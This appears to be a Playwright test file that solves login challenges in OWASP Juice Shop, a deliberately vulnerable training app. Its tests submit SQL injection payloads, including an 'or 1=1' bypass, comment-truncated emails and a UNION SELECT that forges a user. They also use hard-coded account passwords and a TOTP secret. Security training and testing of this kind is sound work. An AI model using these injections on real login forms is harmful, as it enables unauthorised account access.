import { test, expect } from '@playwright/test';

test.beforeEach(({ page }) => {
  page.goto('http://localhost:3000/#/login');
});

test.describe('login page accepts valid credentials and rejects invalid ones', () => {
  test.describe('challenge "loginAdminChallenge"', () => {
    test('should log in Admin with SQLI attack on email field using "\' or 1=1--"', async ({ page }) => {
      await page.fill('#email', "' or 1=1--");
      await page.fill('#password', 'a');
      await page.click('#loginButton');
    });

    test('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `admin@${appDomain}'--`);
      await page.fill('#password', 'a');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "loginJimChallenge"', () => {
    test('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `jim@${appDomain}'--`);
      await page.fill('#password', 'a');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "loginBenderChallenge"', () => {
    test('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `bender@${appDomain}'--`);
      await page.fill('#password', 'a');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "weakPasswordChallenge"', () => {
    test('should be able to log in with original (weak) admin credentials', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `admin@${appDomain}`);
      await page.fill('#password', 'admin123');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "loginSupportChallenge"', () => {
    test('should be able to log in with original support-team credentials', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `support@${appDomain}`);
      await page.fill('#password', 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "loginRapperChallenge"', () => {
    test('should be able to log in with original MC SafeSearch credentials', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `mc.safesearch@${appDomain}`);
      await page.fill('#password', 'Mr. N00dles');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "loginAmyChallenge"', () => {
    test('should be able to log in with original Amy credentials', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `amy@${appDomain}`);
      await page.fill('#password', 'K1f.....................');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "dlpPasswordSprayingChallenge"', () => {
    test('should be able to log in with original Jannik credentials', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `J12934@${appDomain}`);
      await page.fill('#password', '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "twoFactorAuthUnsafeSecretStorageChallenge"', () => {
    test('should be able to log into a existing 2fa protected account given the right token', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `wurstbrot@${appDomain}'--`);
      await page.fill('#password', 'Never mind...');
      await page.click('#loginButton');

      await page.fill('#totpToken', 'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH');
      await page.click('#totpSubmitButton');
    });
  });

  test.describe('challenge "oauthUserPasswordChallenge"', () => {
    test('should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password', async ({ page }) => {
      await page.fill('#email', 'bjoern.kimminich@gmail.com');
      await page.fill('#password', 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "ghostLoginChallenge"', () => {
    test('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', async ({ page }) => {
      await page.fill('#email', "' or deletedAt IS NOT NULL--");
      await page.fill('#password', 'a');
      await page.click('#loginButton');
    });

    test('should be able to log in as chris.pike@juice-sh.op by using "chris.pike@juice-sh.op\' --"', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `chris.pike@${appDomain}'--`);
      await page.fill('#password', 'a');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "ephemeralAccountant"', () => {
    test('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', async ({ page }) => {
      await page.fill('#email', 
        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
        { delay: 100 }
      );
      await page.fill('#password', 'a');
      await page.click('#loginButton');
    });
  });

  test.describe('challenge "exposedCredentialsChallenge"', () => {
    test('should be able to log in with testing credentials that are leaked on client', async ({ page }) => {
      const appDomain = await page.evaluate(() => process.env.APPLICATION_DOMAIN);
      await page.fill('#email', `testing@${appDomain}`);
      await page.fill('#password', 'IamUsedForTesting');
      await page.click('#loginButton');
    });
  });
});
